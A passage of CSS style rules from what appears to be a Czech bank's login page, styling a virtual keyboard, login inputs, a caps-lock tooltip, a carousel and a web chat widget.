            background-image: url("data:image/svg+xml,%3Csvg width='23' height='12' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%23fff' d='M.897 0h22.07v12H.898z'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M.897 12V0h22.07v12H.898zM17.75 2h-2.007v2h2.007V2zm-2.007 3h2.007v2h-2.007V5zm-1.203-3h-2.007v2h2.007V2zm-2.007 3h2.007v2h-2.007V5zM11.33 2H9.324v2h2.006V2zM9.324 5h2.006v2H9.324V5zM8.12 2H6.114v2H8.12V2zM6.114 5H8.12v2H6.114V5zm-3.21 2H4.91V5H2.903v2zM4.91 4H2.903V2H4.91v2zm.2 6.3h13.845v-2H5.11v2zM20.961 7h-2.006V5h2.006v2zm-2.006-3h2.006V2h-2.006v2z' fill='%23A3B5C9'/%3E%3C/svg%3E");
            background-repeat: no-repeat
        }

        div.flVirtualKeyboardWrapper {
            position: fixed;
            bottom: 80px;
            left: 0;
            width: 100%;
            overflow-x: auto;
            z-index: 10001
        }

        div.flVirtualKeyboard {
            background: #f2f7f9 none repeat scroll 0 0;
            border-radius: 4px;
            box-shadow: 0 -6px 1px 0 #c6d3da inset;
            box-sizing: border-box;
            width: 928px;
            height: 286px;
            padding: 13px 21px 21px;
            margin: 0 auto
        }

        div.flVirtualKeyboard div.vkHeader {
            color: #596a72;
            display: block;
            float: left;
            font-size: 18px;
            height: 27px;
            width: 100%
        }

        div.flVirtualKeyboard div.vkHeader span.closeBtn {
            cursor: pointer;
            position: absolute;
            right: 0
        }

        div.flVirtualKeyboard div.textKeyboard {
            float: left;
            width: 640px;
            margin-top: 2px
        }

        div.flVirtualKeyboard div.numKeyboard {
            float: right
        }

        div.flVirtualKeyboard table {
            border-collapse: separate;
            border-spacing: 2px
        }

        div.flVirtualKeyboard div.numKeyboard table {
            border-collapse: separate;
            border-spacing: 5px
        }

        div.flVirtualKeyboard table tr {
            white-space: nowrap
        }

        div.flVirtualKeyboard table tr td.key span.wrapper,
        div.flVirtualKeyboard .numKeyboard table tr td.key {
            background-color: #d5e4eb;
            border-radius: 3px;
            box-shadow: 0 -4px 0 0 #c5d7e0 inset;
            box-sizing: border-box;
            color: #596a72;
            cursor: default;
            display: table-cell;
            font-family: 'Open Sans', sans-serif;
            font-size: 18px;
            height: 50px;
            margin: 3px;
            min-width: 50px;
            padding: 9px 15px 11px;
            text-align: center;
            transition: background-color 0.15s ease-in-out 0s;
            vertical-align: middle
        }

        div.flVirtualKeyboard table tr td.key span.wrapper:active,
        div.flVirtualKeyboard .numKeyboard table tr td.key:active {
            background-color: #c9dae2
        }

        .lines {
            background-image: url(./assets/img/line.ccf1c0476b3a0299698eeaf1396e6033.jpg);
            background-repeat: repeat-x;
            margin-left: 4px;
            width: 612px
        }

        .backspace {
            padding-top: 6px
        }

        .ng-binding.shift-l span.wrapper {
            min-width: 81px !important;
            text-align: left !important
        }

        .ng-binding.symboly span.wrapper {
            min-width: 108px !important
        }

        .ng-binding.wavelet span.wrapper {
            min-width: 81px !important
        }

        .prvni {
            margin-right: -2px;
            float: right
        }

        .druha {
            margin-left: 4px;
            padding-left: 55px
        }

        .specialCharacters.treti tr td:nth-of-type(1) {
            visibility: hidden
        }

        .ng-binding.dot {
            width: 52px
        }

        .textKeyboard .special {
            display: none
        }

        .textKeyboard .chars {
            display: block
        }

        .textKeyboard .specialCharacters .special {
            display: block
        }

        .textKeyboard .specialCharacters .chars {
            display: none
        }

        * {
            margin: 0;
            padding: 0
        }

        :focus {
            outline: none
        }

        input::-ms-reveal,
        input::-ms-clear {
            display: none
        }

        app-root {
            display: flex;
            width: 100%;
            height: 100%
        }

        app-root input.input:has(.ng-not-empty) ~ label,
        app-root input.input.error:has(.ng-not-empty) ~ label {
            display: none
        }

        app-root .input {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            height: 48px;
            width: 100%;
            --bg-opacity: 1;
            background-color: #ffffff;
            background-color: rgba(255, 255, 255, var(--bg-opacity));
            border-width: 1px;
            border-radius: 0.375rem;
            padding-left: 0.625rem;
            padding-right: 0.625rem;
            padding-top: 0.6875rem;
            padding-bottom: 0.6875rem;
            --border-opacity: 1;
            border-color: #A3B5C9;
            border-color: rgba(163, 181, 201, var(--border-opacity))
        }

        app-root .input::-moz-placeholder {
            --text-opacity: 1;
            color: #5C7999;
            color: rgba(92, 121, 153, var(--text-opacity))
        }

        app-root .input:-ms-input-placeholder {
            --text-opacity: 1;
            color: #5C7999;
            color: rgba(92, 121, 153, var(--text-opacity))
        }

        app-root .input::placeholder {
            --text-opacity: 1;
            color: #5C7999;
            color: rgba(92, 121, 153, var(--text-opacity))
        }

        app-root .input:hover {
            --border-opacity: 1;
            border-color: #5C7999;
            border-color: rgba(92, 121, 153, var(--border-opacity))
        }

        app-root .input:focus {
            --border-opacity: 1;
            border-color: #1a67d2;
            border-color: rgba(26, 103, 210, var(--border-opacity))
        }

        app-root .input:disabled {
            background-color: rgba(244, 246, 250, 0.5);
            color: rgba(163, 181, 201, 0.5);
            border-color: rgba(163, 181, 201, 0.5)
        }

        app-root .input:disabled::-moz-placeholder {
            color: rgba(163, 181, 201, 0.5)
        }

        app-root .input:disabled:-ms-input-placeholder {
            color: rgba(163, 181, 201, 0.5)
        }

        app-root .input:disabled::placeholder {
            color: rgba(163, 181, 201, 0.5)
        }

        app-root .input.error {
            --border-opacity: 1;
            border-color: #E72222;
            border-color: rgba(231, 34, 34, var(--border-opacity));
            --text-opacity: 1;
            color: #E72222;
            color: rgba(231, 34, 34, var(--text-opacity))
        }

        app-root .input.error::-moz-placeholder {
            --text-opacity: 1;
            color: #E72222;
            color: rgba(231, 34, 34, var(--text-opacity))
        }

        app-root .input.error:-ms-input-placeholder {
            --text-opacity: 1;
            color: #E72222;
            color: rgba(231, 34, 34, var(--text-opacity))
        }

        app-root .input.error::placeholder {
            --text-opacity: 1;
            color: #E72222;
            color: rgba(231, 34, 34, var(--text-opacity))
        }

        app-root .input.error:hover {
            --border-opacity: 1;
            border-color: #E72222;
            border-color: rgba(231, 34, 34, var(--border-opacity))
        }

        app-root .input.error:focus {
            --border-opacity: 1;
            border-color: #E72222;
            border-color: rgba(231, 34, 34, var(--border-opacity))
        }

        app-root app-input-wrapper {
            display: block;
            margin-top: 1rem;
            margin-bottom: 1rem
        }

        app-root app-button {
            display: block;
            margin-top: 1rem;
            margin-bottom: 1rem
        }

        app-root app-link {
            display: block;
            margin-top: 0.5rem;
            margin-bottom: 0.5rem
        }

        app-root select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 11.322l3.577-3.578a.833.833 0 111.179 1.179l-4.167 4.166a.833.833 0 01-1.178 0L5.244 8.923a.833.833 0 111.179-1.179L10 11.322z' fill='%231A67D2'/%3E%3C/svg%3E");
            background-position-x: calc(100% - 15px);
            background-repeat: no-repeat;
            background-position-y: center
        }

        app-root select:disabled {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 11.322l3.577-3.578a.833.833 0 111.179 1.179l-4.167 4.166a.833.833 0 01-1.178 0L5.244 8.923a.833.833 0 111.179-1.179L10 11.322z' fill='%23A3B5C9' fill-opacity='.5'/%3E%3C/svg%3E")
        }

        app-root select::-ms-expand {
            display: none;
            border: none
        }

        app-root .squaredThree > label {
            display: block
        }

        app-root .squaredThree {
            width: 16px;
            position: absolute;
            margin-top: 1px
        }

        app-root .squaredThree label.check {
            cursor: pointer;
            position: absolute;
            width: 16px;
            height: 16px;
            top: 0;
            padding: 0px;
            background: white;
            box-shadow: inset 0 2px 6px 0 rgba(171, 183, 189, 0.25);
            -webkit-box-shadow: inset 0 2px 6px 0 rgba(171, 183, 189, 0.25);
            -moz-box-shadow: inset 0 2px 6px 0 rgba(171, 183, 189, 0.25);
            border-radius: 3px;
            border: 1px solid #e0e9ed
        }

        app-root .squaredThree label.check:after {
            -ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=0)';
            filter: alpha(opacity=0);
            opacity: 0;
            content: '';
            position: absolute;
            width: 8px;
            height: 4px;
            background: white;
            top: 4px;
            left: 3px;
            border: 2px solid #5f5f5f;
            border-top: none;
            border-right: none;
            transform: rotate(-45deg)
        }

        app-root .squaredThree label.check:hover::after {
            -ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=30)';
            filter: alpha(opacity=0);
            opacity: 0
        }

        app-root .squaredThree input[type='checkbox']:checked + label.check:after {
            -ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=100)';
            filter: alpha(opacity=100);
            opacity: 1
        }

        app-root .remember {
            float: left;
            padding-left: 28px
        }

        @media only screen and (max-width: 480px) {
            app-root .box-container {
                flex-direction: column-reverse;
                margin-left: 1rem;
                margin-right: 1rem
            }

            app-root .info-box {
                margin-bottom: 0.25rem;
                margin-top: 0
            }
        }

        @media (min-width: 375px) {
            .xs\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 375px) and (min-width: 375px) {
            .xs\:container {
                max-width: 375px
            }
        }

        @media (min-width: 375px) and (min-width: 480px) {
            .xs\:container {
                max-width: 480px
            }
        }

        @media (min-width: 375px) and (min-width: 640px) {
            .xs\:container {
                max-width: 640px
            }
        }

        @media (min-width: 375px) and (min-width: 768px) {
            .xs\:container {
                max-width: 768px
            }
        }

        @media (min-width: 375px) and (min-width: 1024px) {
            .xs\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 375px) and (min-width: 1280px) {
            .xs\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 375px) and (min-width: 1536px) {
            .xs\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 375px) {
            .xs\:mx-0 {
                margin-left: 0;
                margin-right: 0
            }

            .xs\:w-343 {
                width: 343px
            }
        }

        @media (min-width: 480px) {
            .xsm\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 480px) and (min-width: 375px) {
            .xsm\:container {
                max-width: 375px
            }
        }

        @media (min-width: 480px) and (min-width: 480px) {
            .xsm\:container {
                max-width: 480px
            }
        }

        @media (min-width: 480px) and (min-width: 640px) {
            .xsm\:container {
                max-width: 640px
            }
        }

        @media (min-width: 480px) and (min-width: 768px) {
            .xsm\:container {
                max-width: 768px
            }
        }

        @media (min-width: 480px) and (min-width: 1024px) {
            .xsm\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 480px) and (min-width: 1280px) {
            .xsm\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 480px) and (min-width: 1536px) {
            .xsm\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 480px) {
            .xsm\:h-12 {
                height: 3rem
            }
        }

        @media (min-width: 640px) {
            .sm\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 640px) and (min-width: 375px) {
            .sm\:container {
                max-width: 375px
            }
        }

        @media (min-width: 640px) and (min-width: 480px) {
            .sm\:container {
                max-width: 480px
            }
        }

        @media (min-width: 640px) and (min-width: 640px) {
            .sm\:container {
                max-width: 640px
            }
        }

        @media (min-width: 640px) and (min-width: 768px) {
            .sm\:container {
                max-width: 768px
            }
        }

        @media (min-width: 640px) and (min-width: 1024px) {
            .sm\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 640px) and (min-width: 1280px) {
            .sm\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 640px) and (min-width: 1536px) {
            .sm\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 640px) {
            .sm\:flex-row {
                flex-direction: row
            }

            .sm\:min-w-142 {
                min-width: 142px
            }

            .sm\:py-12 {
                padding-top: 3rem;
                padding-bottom: 3rem
            }
        }

        @media (min-width: 768px) {
            .md\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 768px) and (min-width: 375px) {
            .md\:container {
                max-width: 375px
            }
        }

        @media (min-width: 768px) and (min-width: 480px) {
            .md\:container {
                max-width: 480px
            }
        }

        @media (min-width: 768px) and (min-width: 640px) {
            .md\:container {
                max-width: 640px
            }
        }

        @media (min-width: 768px) and (min-width: 768px) {
            .md\:container {
                max-width: 768px
            }
        }

        @media (min-width: 768px) and (min-width: 1024px) {
            .md\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 768px) and (min-width: 1280px) {
            .md\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 768px) and (min-width: 1536px) {
            .md\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 1024px) {
            .lg\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 1024px) and (min-width: 375px) {
            .lg\:container {
                max-width: 375px
            }
        }

        @media (min-width: 1024px) and (min-width: 480px) {
            .lg\:container {
                max-width: 480px
            }
        }

        @media (min-width: 1024px) and (min-width: 640px) {
            .lg\:container {
                max-width: 640px
            }
        }

        @media (min-width: 1024px) and (min-width: 768px) {
            .lg\:container {
                max-width: 768px
            }
        }

        @media (min-width: 1024px) and (min-width: 1024px) {
            .lg\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 1024px) and (min-width: 1280px) {
            .lg\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 1024px) and (min-width: 1536px) {
            .lg\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 1280px) {
            .xl\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 1280px) and (min-width: 375px) {
            .xl\:container {
                max-width: 375px
            }
        }

        @media (min-width: 1280px) and (min-width: 480px) {
            .xl\:container {
                max-width: 480px
            }
        }

        @media (min-width: 1280px) and (min-width: 640px) {
            .xl\:container {
                max-width: 640px
            }
        }

        @media (min-width: 1280px) and (min-width: 768px) {
            .xl\:container {
                max-width: 768px
            }
        }

        @media (min-width: 1280px) and (min-width: 1024px) {
            .xl\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 1280px) and (min-width: 1280px) {
            .xl\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 1280px) and (min-width: 1536px) {
            .xl\:container {
                max-width: 1536px
            }
        }

        @media (min-width: 1536px) {
            .\32xl\:container {
                width: 100%;
                padding-right: 1rem;
                padding-left: 1rem
            }
        }

        @media (min-width: 1536px) and (min-width: 375px) {
            .\32xl\:container {
                max-width: 375px
            }
        }

        @media (min-width: 1536px) and (min-width: 480px) {
            .\32xl\:container {
                max-width: 480px
            }
        }

        @media (min-width: 1536px) and (min-width: 640px) {
            .\32xl\:container {
                max-width: 640px
            }
        }

        @media (min-width: 1536px) and (min-width: 768px) {
            .\32xl\:container {
                max-width: 768px
            }
        }

        @media (min-width: 1536px) and (min-width: 1024px) {
            .\32xl\:container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 1536px) and (min-width: 1280px) {
            .\32xl\:container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 1536px) and (min-width: 1536px) {
            .\32xl\:container {
                max-width: 1536px
            }
        }
    </style>
    <style>
        .capslock-tooltip {
            background-color: transparent;
            box-shadow: none;
            margin: 0;
            margin-top: -81px;
            left: 50%;
            padding: 5px 0;
            position: absolute;
            z-index: 1070;
            display: block;
            line-break: auto;
            line-height: 1.42857143;
            text-align: start;
            font-size: 12px;
            opacity: 0.8
        }

        .capslock-tooltip .capslock-tooltip-arrow {
            position: absolute;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid;
            bottom: 0;
            left: 0;
            margin-left: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000
        }

        .capslock-tooltip .capslock-tooltip-inner {
            margin: 0;
            margin-left: calc(-50% - 8px);
            width: 100%;
            max-width: 200px;
            padding: 3px 8px;
            color: #fff;
            text-align: center;
            background-color: #000;
            border-radius: 4px;
            display: block
        }
    </style>
    <style>
        .info-box-content a {
            --text-opacity: 1;
            color: #1a67d2;
            color: rgba(26, 103, 210, var(--text-opacity));
            font-weight: 700
        }

        .info-box-content a:hover {
            text-decoration: underline
        }
    </style>
    <style>
        @import url(https://rsms.me/inter/inter.css);
    </style>
    <style>
        .carousel.carousel-slider .control-arrow,
        .carousel .control-arrow {
            -webkit-transition: all .25s ease-in;
            -moz-transition: all .25s ease-in;
            -ms-transition: all .25s ease-in;
            -o-transition: all .25s ease-in;
            transition: all .25s ease-in;
            opacity: .4;
            filter: alpha(opacity=40);
            position: absolute;
            z-index: 2;
            top: 20px;
            background: none;
            border: 0;
            font-size: 32px;
            cursor: pointer
        }

        .carousel .control-arrow:focus,
        .carousel .control-arrow:hover {
            opacity: 1;
            filter: alpha(opacity=100)
        }

        .carousel.carousel-slider .control-arrow:before,
        .carousel .control-arrow:before {
            margin: 0 5px;
            display: inline-block;
            border-top: 8px solid transparent;
            border-bottom: 8px solid transparent;
            content: ""
        }

        .carousel .control-disabled.control-arrow {
            opacity: 0;
            filter: alpha(opacity=0);
            cursor: inherit;
            display: none
        }

        .carousel .control-prev.control-arrow {
            left: 0
        }

        .carousel .control-prev.control-arrow:before {
            border-right: 8px solid #fff
        }

        .carousel .control-next.control-arrow {
            right: 0
        }

        .carousel .control-next.control-arrow:before {
            border-left: 8px solid #fff
        }

        .carousel-root {
            outline: none
        }

        .carousel {
            position: relative;
            width: 100%
        }

        .carousel * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        .carousel img {
            width: 100%;
            display: inline-block;
            pointer-events: none
        }

        .carousel .carousel {
            position: relative
        }

        .carousel .control-arrow {
            outline: 0;
            border: 0;
            background: none;
            top: 50%;
            margin-top: -13px;
            font-size: 18px
        }

        .carousel .thumbs-wrapper {
            margin: 20px;
            overflow: hidden
        }

        .carousel .thumbs {
            -webkit-transition: all .15s ease-in;
            -moz-transition: all .15s ease-in;
            -ms-transition: all .15s ease-in;
            -o-transition: all .15s ease-in;
            transition: all .15s ease-in;
            -webkit-transform: translateZ(0);
            -moz-transform: translateZ(0);
            -ms-transform: translateZ(0);
            -o-transform: translateZ(0);
            transform: translateZ(0);
            position: relative;
            list-style: none;
            white-space: nowrap
        }

        .carousel .thumb {
            -webkit-transition: border .15s ease-in;
            -moz-transition: border .15s ease-in;
            -ms-transition: border .15s ease-in;
            -o-transition: border .15s ease-in;
            transition: border .15s ease-in;
            display: inline-block;
            margin-right: 6px;
            white-space: nowrap;
            overflow: hidden;
            border: 3px solid #fff;
            padding: 2px
        }

        .carousel .thumb:focus {
            border: 3px solid #ccc;
            outline: none
        }

        .carousel .thumb.selected,
        .carousel .thumb:hover {
            border: 3px solid #333
        }

        .carousel .thumb img {
            vertical-align: top
        }

        .carousel.carousel-slider {
            position: relative;
            margin: 0;
            overflow: hidden
        }

        .carousel.carousel-slider .control-arrow {
            top: 0;
            color: #fff;
            font-size: 26px;
            bottom: 0;
            margin-top: 0;
            padding: 5px
        }

        .carousel.carousel-slider .control-arrow:hover {
            background: rgba(0, 0, 0, .2)
        }

        .carousel .slider-wrapper {
            overflow: hidden;
            margin: auto;
            width: 100%;
            -webkit-transition: height .15s ease-in;
            -moz-transition: height .15s ease-in;
            -ms-transition: height .15s ease-in;
            -o-transition: height .15s ease-in;
            transition: height .15s ease-in
        }

        .carousel .slider-wrapper.axis-horizontal .slider {
            -ms-box-orient: horizontal;
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -moz-flex;
            display: -webkit-flex;
            display: flex
        }

        .carousel .slider-wrapper.axis-horizontal .slider .slide {
            flex-direction: column;
            flex-flow: column
        }

        .carousel .slider-wrapper.axis-vertical {
            -ms-box-orient: horizontal;
            display: -webkit-box;
            display: -moz-box;
            display: -ms-flexbox;
            display: -moz-flex;
            display: -webkit-flex;
            display: flex
        }

        .carousel .slider-wrapper.axis-vertical .slider {
            -webkit-flex-direction: column;
            flex-direction: column
        }

        .carousel .slider {
            margin: 0;
            padding: 0;
            position: relative;
            list-style: none;
            width: 100%
        }

        .carousel .slider.animated {
            -webkit-transition: all .35s ease-in-out;
            -moz-transition: all .35s ease-in-out;
            -ms-transition: all .35s ease-in-out;
            -o-transition: all .35s ease-in-out;
            transition: all .35s ease-in-out
        }

        .carousel .slide {
            min-width: 100%;
            margin: 0;
            position: relative;
            text-align: center
        }

        .carousel .slide img {
            width: 100%;
            vertical-align: top;
            border: 0
        }

        .carousel .slide iframe {
            display: inline-block;
            width: calc(100% - 80px);
            margin: 0 40px 40px;
            border: 0
        }

        .carousel .slide .legend {
            -webkit-transition: all .5s ease-in-out;
            -moz-transition: all .5s ease-in-out;
            -ms-transition: all .5s ease-in-out;
            -o-transition: all .5s ease-in-out;
            transition: all .5s ease-in-out;
            position: absolute;
            bottom: 40px;
            left: 50%;
            margin-left: -45%;
            width: 90%;
            border-radius: 10px;
            background: #000;
            color: #fff;
            padding: 10px;
            font-size: 12px;
            text-align: center;
            opacity: .25;
            -webkit-transition: opacity .35s ease-in-out;
            -moz-transition: opacity .35s ease-in-out;
            -ms-transition: opacity .35s ease-in-out;
            -o-transition: opacity .35s ease-in-out;
            transition: opacity .35s ease-in-out
        }

        .carousel .control-dots {
            position: absolute;
            bottom: 0;
            margin: 10px 0;
            padding: 0;
            text-align: center;
            width: 100%;
            z-index: 1
        }

        @media (min-width: 960px) {
            .carousel .control-dots {
                bottom: 0
            }
        }

        .carousel .control-dots .dot {
            -webkit-transition: opacity .25s ease-in;
            -moz-transition: opacity .25s ease-in;
            -ms-transition: opacity .25s ease-in;
            -o-transition: opacity .25s ease-in;
            transition: opacity .25s ease-in;
            opacity: .3;
            filter: alpha(opacity=30);
            box-shadow: 1px 1px 2px rgba(0, 0, 0, .9);
            background: #fff;
            border-radius: 50%;
            width: 8px;
            height: 8px;
            cursor: pointer;
            display: inline-block;
            margin: 0 8px
        }

        .carousel .control-dots .dot.selected,
        .carousel .control-dots .dot:hover {
            opacity: 1;
            filter: alpha(opacity=100)
        }

        .carousel .carousel-status {
            position: absolute;
            top: 0;
            right: 0;
            padding: 5px;
            font-size: 10px;
            text-shadow: 1px 1px 1px rgba(0, 0, 0, .9);
            color: #fff
        }

        .carousel:hover .slide .legend {
            opacity: 1
        }

        .log-error,
        .log-warning {
            border-color: red
        }

        .log-debug,
        .log-info {
            border-color: green
        }

        .log-debug,
        .log-error,
        .log-info,
        .log-warning {
            display: block;
            border-width: 1px;
            border-radius: 6px;
            border-style: solid;
            padding: 3px;
            font-family: Menlo, monospace;
            font-size: 85%;
            background: #fff;
            margin: 3px 0 0
        }

        @keyframes fly-in {
            0% {
                transform: scale(.85) translateY(10%);
                opacity: 0
            }
            to {
                transform: scale(1) translateY(0);
                opacity: 1
            }
        }

        @keyframes highlight-chat-on-incoming-message__teaser {
            0% {
                background-color: #21416c;
                border-right: 2px inset #fff
            }
            to {
                background-color: #1452a8;
                border-right: 2px inset transparent
            }
        }

        @keyframes highlight-chat-on-incoming-message__webchat {
            0% {
                border-left: 2px inset #fff;
                border-top: 2px inset #fff;
                box-shadow: 0 0 30px rgba(4, 37, 108, .7)
            }
            to {
                border-left: 2px inset transparent;
                border-top: 2px inset transparent
            }
        }

        @keyframes highlight-chat-on-incoming-message__chat-container {
            0% {
                background-color: #f4f6fa;
                border-right: 2px outset transparent
            }
            to {
                background-color: #e4eaf0;
                border-right: 2px outset #fff
            }
        }

        @keyframes highlight-chat-on-incoming-message__composer__submit-button {
            0% {
                background-image: url(https://webchat.csas.cz/77eb11e0478da06ba0cdb1a808c25647.svg)
            }
            to {
                background-image: url(https://webchat.csas.cz/704e0642e148e1b7a1b0d64c57e0c3f5.svg)
            }
        }

        .webchat.highlight-chat {
            animation: highlight-chat-on-incoming-message__webchat 1s ease-in-out infinite alternate
        }

        .webchat.highlight-chat .chat-container {
            animation: highlight-chat-on-incoming-message__chat-container 1s ease-in-out infinite alternate
        }

        .webchat.highlight-chat .teaser {
            animation: highlight-chat-on-incoming-message__teaser 1s ease-in-out infinite alternate
        }

        .webchat.highlight-chat .composer__submit-button {
            animation: highlight-chat-on-incoming-message__composer__submit-button 1s ease-in-out infinite alternate
        }

        .webchat {
            position: fixed;
            backface-visibility: hidden;
            width: 345px;
            min-width: 345px;
            max-width: 345px;
            right: 20px;
            bottom: 0;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            box-shadow: 0 0 5px rgba(0, 0, 0, .5);
            font: 16px Inter, sans-serif;
            z-index: 9999;
            outline: none
        }

        .webchat p {
            margin: 0
        }

        .webchat .composer {
            background-color: #fff;
            display: flex;
            position: relative;
            border-top: 1px solid #d8dee3
        }

        .webchat .composer__input-container {
            border-radius: 22px;
            display: flex;
            background-color: #fff;
            margin: 12px 0 12px 14px;
            padding: 0 0 0 13px;
            width: 100%;
            border: 1px solid #5c7999
        }

        .webchat .composer__input {
            font: 16px Inter, sans-serif;
            color: #003658;
            border: none;
            box-sizing: border-box;
            line-height: 28px;
            height: 40px;
            width: 100%;
            padding: 7px 0;
            resize: none;
            overflow: hidden;
            background-color: transparent;
            outline-width: 0
        }

        .webchat .composer__input::-ms-clear {
            width: 0;
            height: 0
        }

        .webchat .composer__input::placeholder {
            color: #5c7999
        }

        .webchat .composer__submit-button {
            width: 40px;
            height: 40px;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/77eb11e0478da06ba0cdb1a808c25647.svg);
            background-position: 50%;
            background-size: contain;
            background-repeat: no-repeat;
            border: none;
            margin: auto 14px;
            padding: 20px;
            outline-width: 0
        }

        .webchat .composer__submit-button:hover {
            cursor: pointer
        }

        .webchat .composer__emoji-popup-button {
            width: 17px;
            height: 17px;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/9873794d4ff654f1a895ac89e026a7b6.svg);
            background-position: 50%;
            background-size: contain;
            background-repeat: no-repeat;
            border: none;
            margin: auto 10px;
            padding: 8.5px;
            outline-width: 0
        }

        .webchat .composer__emoji-popup-button:hover {
            cursor: pointer
        }

        .webchat .state--not-connected {
            font-weight: 700;
            margin: 6px 0 3px 6px;
            padding: 3px 30px;
            text-align: center;
            border: 1px solid #1a67d2;
            border-radius: 4px;
            color: #1a67d2
        }

        .webchat .state--not-connected .spinner-css .spinner-css__bars {
            padding: 13px 0
        }

        .webchat .state__previous-events-loading--failed {
            font-weight: 700;
            margin: -3px 0 6px 6px;
            padding: 3px 10px;
            text-align: center;
            border: 1px solid #1a67d2;
            border-radius: 4px;
            color: #1a67d2
        }

        .webchat .state__previous-events-loading--failed > button {
            background: none;
            color: inherit;
            border: none;
            padding: 0;
            font: inherit;
            text-decoration: underline;
            cursor: pointer
        }

        .webchat .teaser {
            position: relative;
            background-color: #1452a8;
            height: 47px;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            text-align: left;
            display: flex;
            padding-left: 16px;
            padding-right: 16px;
            align-items: center;
            outline-width: 0;
            border-right: 2px inset transparent
        }

        .webchat .teaser:hover {
            cursor: pointer
        }

        .webchat .teaser__title {
            margin-top: auto;
            color: #fff;
            font: 16px Inter, sans-serif;
            line-height: 47px;
            background-image: url(https://webchat.csas.cz/c169c1360361128da2043506893f7748.svg);
            background-repeat: no-repeat;
            background-position: 0;
            text-indent: 30px
        }

        .webchat .teaser__button--close {
            position: absolute;
            border: none;
            right: 10px;
            top: 0;
            bottom: 0;
            margin: auto;
            width: 14px;
            height: 14px;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/d9dd0d4aeacb30cbd8babe6479c1e78d.svg);
            background-position: 50%;
            background-repeat: no-repeat;
            outline-width: 0;
            padding: 14px
        }

        .webchat .teaser__button--close:hover {
            cursor: pointer
        }

        .webchat .teaser__button--reveal {
            position: absolute;
            border: none;
            right: 36px;
            top: 0;
            bottom: 0;
            margin: auto;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/9716d7ac9733e950e987ac3624b1500f.svg);
            background-position: 50%;
            background-repeat: no-repeat;
            width: 32px;
            height: 32px
        }

        .webchat .teaser__button--reveal:last-child {
            right: 4px
        }

        .webchat .teaser__button--reveal:focus {
            outline: none
        }

        .webchat .teaser__button--reveal:hover {
            cursor: pointer
        }

        .webchat .teaser__button--minimize {
            position: absolute;
            border: none;
            right: 36px;
            top: 10px;
            bottom: 0;
            margin: auto;
            background-color: transparent;
            background-image: url(https://webchat.csas.cz/d1f5e8927a4facb2a263f4812e796fc7.svg);
            background-position: 50%;
            background-repeat: no-repeat;
            width: 32px;
            height: 32px
        }

        .webchat .teaser__button--minimize:last-child {
            right: 4px
        }

        .webchat .teaser__button--minimize:focus {
            outline: none
        }

        .webchat .teaser__button--minimize:hover {
            cursor: pointer
        }

        .webchat .conversation__scroll-container {
            position: relative;
            display: flex;
            align-items: flex-end;
            flex-grow: 1;
            flex: 1;
            overflow: hidden
        }

        .webchat .conversation__top-shadow {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 20px;
            z-index: 10;
            display: none;
            overflow-x: hidden
        }

        .webchat .conversation__top-shadow:after {
            content: "";
            position: absolute;
